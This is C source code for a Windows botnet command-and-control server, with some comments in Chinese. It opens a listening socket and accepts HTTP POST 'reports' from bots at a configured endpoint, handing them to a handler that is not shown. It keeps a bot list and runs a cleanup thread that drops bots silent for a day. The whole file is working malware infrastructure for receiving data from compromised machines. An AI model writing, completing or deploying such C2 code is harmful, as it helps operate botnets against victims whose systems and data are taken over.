#include "c2_server.h"

void initialize_networking() {
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "WSAStartup failed: %d\n", WSAGetLastError());
        exit(1);
    }
}

void cleanup_networking() {
    WSACleanup();
}

SOCKET create_listen_socket() {
    SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (listen_socket == INVALID_SOCKET) {
        fprintf(stderr, "socket failed: %d\n", WSAGetLastError());
        return INVALID_SOCKET;
    }
    
    int reuse = 1;
    if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, (char*)&reuse, sizeof(reuse)) == SOCKET_ERROR) {
        fprintf(stderr, "setsockopt failed: %d\n", WSAGetLastError());
        closesocket(listen_socket);
        return INVALID_SOCKET;
    }
    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);
    
    if (bind(listen_socket, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        fprintf(stderr, "bind failed: %d\n", WSAGetLastError());
        closesocket(listen_socket);
        return INVALID_SOCKET;
    }
    
    if (listen(listen_socket, BACKLOG) == SOCKET_ERROR) {
        fprintf(stderr, "listen failed: %d\n", WSAGetLastError());
        closesocket(listen_socket);
        return INVALID_SOCKET;
    }
    
    printf("[*] Server running on port %d\n", PORT);
    printf("[*] API endpoint: %s\n", global_config->api_endpoint);
    
    return listen_socket;
}

void start_server(SOCKET listen_socket) {
    // 创建bot清理线程
    HANDLE cleaner_thread = (HANDLE)_beginthreadex(NULL, 0, bot_cleaner, NULL, 0, NULL);
    
    // 主服务器循环
    while (1) {
        struct sockaddr_in client_addr;
        int addr_len = sizeof(client_addr);
        
        SOCKET client_socket = accept(listen_socket, (struct sockaddr*)&client_addr, &addr_len);
        if (client_socket == INVALID_SOCKET) {
            fprintf(stderr, "accept failed: %d\n", WSAGetLastError());
            continue;
        }
        
        ClientThreadArgs *args = malloc(sizeof(ClientThreadArgs));
        if (!args) {
            closesocket(client_socket);
            continue;
        }
        
        args->client_socket = client_socket;
        args->config = global_config;
        
        HANDLE thread = (HANDLE)_beginthreadex(NULL, 0, client_handler, args, 0, NULL);
        if (!thread) {
            free(args);
            closesocket(client_socket);
        } else {
            CloseHandle(thread);
        }
    }
    
    CloseHandle(cleaner_thread);
}

unsigned __stdcall client_handler(void *arg) {
    
    ClientThreadArgs *args = (ClientThreadArgs *)arg;
    SOCKET client_socket = args->client_socket;
    ServerConfig *cfg = args->config;
    free(arg);
    
    // 接收HTTP头
    char headers[2048];
    size_t header_len = 0;
    if (recv_http_headers(client_socket, headers, sizeof(headers), &header_len) != 0) {
        #ifdef _DEBUG
        printf("[ERROR] Failed to receive HTTP headers\n");
        #endif
        closesocket(client_socket);
        return 1;
    }
    headers[header_len] = '\0';
    
    #ifdef DEBUG_MODE
    printf("---------- Received Headers ----------\n%s\n-----------------------------\n", headers);
    #endif
    
    // 创建原始头部的副本用于解析（不修改原始数据）
    char headers_copy[2048];
    strncpy_s(headers_copy, sizeof(headers_copy), headers, _TRUNCATE);
    
    // 解析请求行（不修改原始数据）
    char *save_ptr = NULL;
    char *request_line = strtok_s(headers_copy, "\r\n", &save_ptr);
    if (!request_line) {
        closesocket(client_socket);
        printf(" fetch request_line fail! \n");
        return 1;
    }
    
    char *method = strtok_s(request_line, " ", &save_ptr);
    char *url = strtok_s(NULL, " ", &save_ptr);
    
    if (!method || !url) {
        printf(" fetch method || !url fail! \n");
        closesocket(client_socket);
        return 1;
    }

    #ifdef DEBUG_MODE
    printf("[C2] Received %s request to %s\n", method, url);
    printf("[C2] Headers:\n%.*s\n", (int)header_len, headers); // 打印原始头部
    #endif
    
    // 处理GET请求到API端点
    if (_stricmp(method, "GET") == 0 && strcmp(url, cfg->api_endpoint) == 0) {
        closesocket(client_socket);
        return 1;
    // 处理POST请求到报告端点（明文版）
    } else if (_stricmp(method, "POST") == 0 && strcmp(url, cfg->api_endpoint) == 0) {

        printf(" -------- POST ------- \n");
        
        // 使用原始headers获取Content-Length
        int content_length = get_content_length(headers);
        
        #ifdef DEBUG_MODE
        printf("[C2] Received content_length= %d\n", content_length);
        #endif

        if (content_length <= 0) {
            const char *response = "HTTP/1.1 411 Length Required\r\n"
                                "Content-Length: 0\r\n"
                                "Connection: close\r\n\r\n";
            if (send_all(client_socket, response, strlen(response)) < 0) {
                #ifdef _DEBUG
                printf("[ERROR] Failed to send length required response\n");
                #endif
            }
            closesocket(client_socket);
            return 1;
        }
        
        // 接收主体数据
        char *body = (char*)malloc(content_length + 1);
        if (!body) {
            #ifdef _DEBUG
            printf("[ERROR] Memory allocation failed for body\n");
            #endif
            closesocket(client_socket);
            return 1;
        }
        
        if (recv_all(client_socket, body, content_length) != content_length) {
            #ifdef _DEBUG
            printf("[ERROR] Failed to receive full body\n");
            #endif
            free(body);
            closesocket(client_socket);
            return 1;
        }
        body[content_length] = '\0';
        
        handle_report_data(client_socket, headers, body, content_length);
        free(body);
    } else {
        // 其他请求返回404
        const char *response = "HTTP/1.1 404 Not Found\r\n"
                              "Content-Length: 0\r\n"
                              "Connection: close\r\n\r\n";
        send(client_socket, response, (int)strlen(response), 0);
        closesocket(client_socket);
        return 1;
    }
    closesocket(client_socket);
    return 0;
}

unsigned __stdcall bot_cleaner(void *arg) {
    while (1) {
        Sleep(3600 * 1000);
        
        EnterCriticalSection(&bot_mutex);
        time_t now = time(NULL);
        
        for (int i = 0; i < MAX_BOTS; i++) {
            if (bot_list[i].bot_id[0] != '\0' && 
                (now - bot_list[i].last_seen) > 86400) {
                memset(&bot_list[i], 0, sizeof(BotSession));
            }
        }
        
        LeaveCriticalSection(&bot_mutex);
    }
    return 0;
}